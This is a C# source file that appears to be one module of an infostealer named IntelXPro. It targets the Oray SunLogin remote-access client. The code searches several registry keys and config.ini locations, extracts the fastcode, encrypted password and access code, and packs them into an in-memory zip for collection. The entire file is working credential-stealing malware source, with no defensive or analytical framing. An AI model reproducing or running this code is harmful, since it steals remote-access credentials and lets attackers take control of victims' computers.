using IntelXPro.src.IntelXPro.Dependencies.Data;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class sunLogin : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string name = "SOFTWARE\\\\WOW6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\Oray SunLogin RemoteClient";
            string name2 = ".DEFAULT\\\\Software\\\\Oray\\\\SunLogin\\\\SunloginClient\\\\SunloginGreenInfo";
            string name3 = ".DEFAULT\\\\Software\\\\Oray\\\\SunLogin\\\\SunloginClient\\\\SunloginInfo";
            StringBuilder sb = new StringBuilder();
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "Sunlogin";
            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name);
            RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey(name2);
            RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey(name3);
            if (registryKey != null)
            {
                string text = Path.Combine(Registry.LocalMachine.OpenSubKey(name).GetValue("InstallLocation").ToString(), "config.ini");
                string text2 = (File.Exists(text) ? File.ReadAllText(text) : string.Empty);
                string text3 = string.Empty;
                string text4 = string.Empty;
                string text5 = string.Empty;
                if (!string.IsNullOrEmpty(text2))
                {
                    text3 = Regex.Match(text2, "fastcode=(.*)", RegexOptions.Multiline).Groups[1].Value;
                    text4 = Regex.Match(text2, "encry_pwd=(.*)", RegexOptions.Multiline).Groups[1].Value;
                    text5 = Regex.Match(text2, "sunlogincode=(.*)", RegexOptions.Multiline).Groups[1].Value;
                }
                AppendFound("registry_install", text, text3, text4, text5);
            }
            else if (registryKey2 != null)
            {
                string text6 = Registry.LocalMachine.OpenSubKey(name2).GetValue("base_fastcode").ToString();
                string text7 = Registry.LocalMachine.OpenSubKey(name2).GetValue("base_encry_pwd").ToString();
                string text8 = Registry.LocalMachine.OpenSubKey(name2).GetValue("base_sunlogincode").ToString();
                AppendFound("registry_greeninfo", string.Empty, text6, text7, text8);
            }
            else if (registryKey3 != null)
            {
                string text9 = Registry.LocalMachine.OpenSubKey(name3).GetValue("base_fastcode").ToString();
                string text10 = Registry.LocalMachine.OpenSubKey(name3).GetValue("base_encry_pwd").ToString();
                string text11 = Registry.LocalMachine.OpenSubKey(name3).GetValue("base_sunlogincode").ToString();
                AppendFound("registry_info", string.Empty, text9, text10, text11);
            }
            string text12 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Oray", "SunloginClient", "config.ini");
            if (File.Exists(text12))
            {
                string input = File.ReadAllText(text12);
                string value = Regex.Match(input, "fastcode=(.*)", RegexOptions.Multiline).Groups[1].Value;
                string value2 = Regex.Match(input, "encry_pwd=(.*)", RegexOptions.Multiline).Groups[1].Value;
                string value3 = Regex.Match(input, "sunlogincode=(.*)", RegexOptions.Multiline).Groups[1].Value;
                AppendFound("programdata", text12, value, value2, value3);
            }
            string text13 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Oray", "SunloginClientLite", "sys_lite_config.ini");
            if (File.Exists(text13))
            {
                string input2 = File.ReadAllText(text13);
                string value4 = Regex.Match(input2, "fastcode=(.*)", RegexOptions.Multiline).Groups[1].Value;
                string value5 = Regex.Match(input2, "encry_pwd=(.*)", RegexOptions.Multiline).Groups[1].Value;
                string value6 = Regex.Match(input2, "sunlogincode=(.*)", RegexOptions.Multiline).Groups[1].Value;
                AppendFound("user_roaming", text13, value4, value5, value6);
            }
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 3) + "\\Windows\\system32\\config\\systemprofile\\AppData\\Roaming\\Oray\\SunloginClient\\sys_config.ini");
            string text14 = "C:\\\\Windows\\\\system32\\\\config\\\\systemprofile\\\\AppData\\\\Roaming\\\\Oray\\\\SunloginClient\\\\sys_config.ini";
            if (File.Exists(text14))
            {
                string input3 = File.ReadAllText(text14);
                string value7 = Regex.Match(input3, "fastcode=(.*)", RegexOptions.Multiline).Groups[1].Value;
                string value8 = Regex.Match(input3, "encry_pwd=(.*)", RegexOptions.Multiline).Groups[1].Value;
                string value9 = Regex.Match(input3, "sunlogincode=(.*)", RegexOptions.Multiline).Groups[1].Value;
                AppendFound("systemprofile", text14, value7, value8, value9);
            }
            if (sb.Length > 0)
            {
                string text15 = "Sunlogin\\info.txt";
                zip.AddTextFile(text15, sb.ToString());
                counterApplications.Files.Add(text15);
                counter.Applications.Add(counterApplications);
            }
            void AppendFound(string source, string text16, string text17, string text18, string text19)
            {
                sb.AppendLine("Source: " + source);
                if (!string.IsNullOrEmpty(text16))
                {
                    sb.AppendLine("Path: " + text16);
                    counterApplications.Files.Add(text16 + " => Sunlogin\\info.txt");
                }
                sb.AppendLine("Fastcode: " + text17);
                sb.AppendLine("Encry_pwd: " + text18);
                sb.AppendLine("Sunlogincode: " + text19);
                sb.AppendLine();
            }
        }
    }
}
